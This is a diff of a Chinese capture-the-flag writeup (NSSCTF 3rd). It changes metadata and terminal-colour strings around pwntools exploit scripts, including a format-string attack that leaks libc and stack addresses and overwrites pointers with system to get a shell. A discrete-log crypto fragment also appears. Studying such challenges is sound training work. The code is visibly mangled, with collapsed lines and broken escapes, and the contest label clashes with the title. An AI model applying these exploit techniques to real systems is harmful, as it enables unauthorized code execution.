@@ -57,6 +57,9 @@ prerequisites:
 - 格式化字符串漏洞（%p/%n/%hn + 栈偏移）
 - Pohlig-Hellman DLP + CRT
 - Sage Coppersmith small_roots
+contest_normalized: "SCTF"
+contest_year: 2024
+subcategory_guess: "archive"
 ---
 # NSSCTF3rd部分writeup
 
@@ -112,7 +115,7 @@ from pwn import*import sys
 # Define lambda functions for common operationss =lambda data :io.send(data)sa =lambda delim,data :io.sendafter(delim, data)sl =lambda data :io.sendline(data)sla =lambda delim,data :io.sendlineafter(delim, data)r =lambda num :io.recv(num)ru =lambda delims, drop=True :io.recvuntil(delims, drop)rl =lambda :io.recvline()uu32 =lambda data :
 u32(data.ljust(4,b'x00'))uu64 =lambda data :
 u64(data.ljust(8,b'x00'))ls =lambda data :
-log.success(data)lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x 33[0m'% (s, eval(s)))itr =lambda :io.interactive()
+log.success(data)lss =lambda s :ls('\\x0033[1;31;40m%s --> 0x%x\\x0033[0m'% (s, eval(s)))itr =lambda :io.interactive()
 # Context settingscontext.arch ='amd64'context.log_level ='debug'# infocontext.terminal = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):'''Start the exploit against the target.'''if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)elif args.CMD: return process(binary.split(' '))elif args.REM: return remote()elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))''' Usage: python3 exp.py AWD   '''return process([binary] + argv, *a, **kw)
 binary ='./pwn'libelf =''
 elf = ELF(binary);rop = ROP(binary)libc = ELF('libc.so.6')gdbscript ='''#continue'''.format(**locals())
@@ -155,7 +158,7 @@ ezfmt
 from pwn import* import sys # Define lambda functions for common operations s =lambda data :io.send(data) sa =lambda delim,data :io.sendafter(delim, data) sl =lambda data :io.sendline(data) sla =lambda delim,data :io.sendlineafter(delim, data) r =lambda num :io.recv(num) ru =lambda delims, drop=True :io.recvuntil(delims, drop) rl =lambda :io.recvline() uu32 =lambda data :
 u32(data.ljust(4,b'x00')) uu64 =lambda data :
 u64(data.ljust(8,b'x00')) ls =lambda data :
-log.success(data) lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x  33[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
+log.success(data) lss =lambda s :ls('\\x0033[1;31;40m%s --> 0x%x \\x0033[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
 except: exit(0) gdbscript =''' b *0x0401242 #continue '''.format(**locals()) io = start(binary) def sp(pay): ru('>') sl(pay) pay ='%9$p-%6$p-' sp(pay) libc_base =int(ru('-'),16) -147587 stack =int(ru('-'),16) -200 lss('libc_base') lss('stack') pay =f'%{stack &0xffff}c%11$hnx00' sp(pay) pay =f'%{0x4020+1}c%{6+0x21}$hnx00' sp(pay) system = libc_base +336528 t1 = (system >>8) &0xFFFF pay =f'%{t1}c%{6+7}$hnx00' sp(pay) itr()
 
 PART.02
@@ -203,7 +206,7 @@ from pwn import*import sys
 # Define lambda functions for common operationss =lambda data :io.send(data)sa =lambda delim,data :io.sendafter(delim, data)sl =lambda data :io.sendline(data)sla =lambda delim,data :io.sendlineafter(delim, data)r =lambda num :io.recv(num)ru =lambda delims, drop=True :io.recvuntil(delims, drop)rl =lambda :io.recvline()uu32 =lambda data :
 u32(data.ljust(4,b'x00'))uu64 =lambda data :
 u64(data.ljust(8,b'x00'))ls =lambda data :
-log.success(data)lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x 33[0m'% (s, eval(s)))itr =lambda :io.interactive()
+log.success(data)lss =lambda s :ls('\\x0033[1;31;40m%s --> 0x%x\\x0033[0m'% (s, eval(s)))itr =lambda :io.interactive()
 # Context settingscontext.arch ='amd64'context.log_level ='debug'# infocontext.terminal = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):'''Start the exploit against the target.'''if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)elif args.CMD: return process(binary.split(' '))elif args.REM: return remote()elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))''' Usage: python3 exp.py AWD   '''return process([binary] + argv, *a, **kw)
 binary ='./pwn'libelf =''
 elf = ELF(binary);rop = ROP(binary)libc = ELF('libc.so.6')gdbscript ='''#continue'''.format(**locals())
@@ -235,7 +238,7 @@ itr()
 from pwn import* import sys # Define lambda functions for common operations s =lambda data :io.send(data) sa =lambda delim,data :io.sendafter(delim, data) sl =lambda data :io.sendline(data) sla =lambda delim,data :io.sendlineafter(delim, data) r =lambda num :io.recv(num) ru =lambda delims, drop=True :io.recvuntil(delims, drop) rl =lambda :io.recvline() uu32 =lambda data :
 u32(data.ljust(4,b'x00')) uu64 =lambda data :
 u64(data.ljust(8,b'x00')) ls =lambda data :
-log.success(data) lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x  33[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
+log.success(data) lss =lambda s :ls('\\x0033[1;31;40m%s --> 0x%x \\x0033[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
 except: exit(0) gdbscript =''' b *0x0401242 #continue '''.format(**locals()) io = start(binary) def sp(pay): ru('>') sl(pay) pay ='%9$p-%6$p-' sp(pay) libc_base =int(ru('-'),16) -147587 stack =int(ru('-'),16) -200 lss('libc_base') lss('stack') pay =f'%{stack &0xffff}c%11$hnx00' sp(pay) pay =f'%{0x4020+1}c%{6+0x21}$hnx00' sp(pay) system = libc_base +336528 t1 = (system >>8) &0xFFFF pay =f'%{t1}c%{6+7}$hnx00' sp(pay) itr()
 from Crypto.Util.number import*
 def babystep_giantstep(g, y, p, q=None):if q isNone: q = p -1 m =int(q**0.5+0.5) table = {} gr =1for r inrange(m): table[gr] = r gr = (gr * g) % p
